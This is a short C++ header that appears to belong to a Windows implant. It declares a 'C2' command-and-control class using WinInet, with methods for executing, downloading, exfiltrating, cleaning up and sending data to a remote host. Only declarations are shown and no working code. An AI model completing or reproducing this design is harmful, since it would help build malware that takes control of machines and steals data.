using namespace std;

#pragma once
#include <string>
#include <windows.h>
#include <wininet.h>
#include "UTIL.h"
#include "PH.h"
/*
	Command Module:
	Responsible for C2 functionality
*/

class C2 {

	HINTERNET sessionHandle = NULL;
	HINTERNET connectHandle = NULL;
	HINTERNET requestHandle = NULL;

	PH ph;
	UTIL util;

public:
	DWORD error = NULL;
	C2() {};
	void getCurrentDirectory();
	void execute();
	void download();
	void exfiltrate();
	void cleanup();
	void start();
	void netsend(LPCSTR hostName, LPCSTR pathName);
	bool isFileEmpty();
	string boolToString(bool b);
};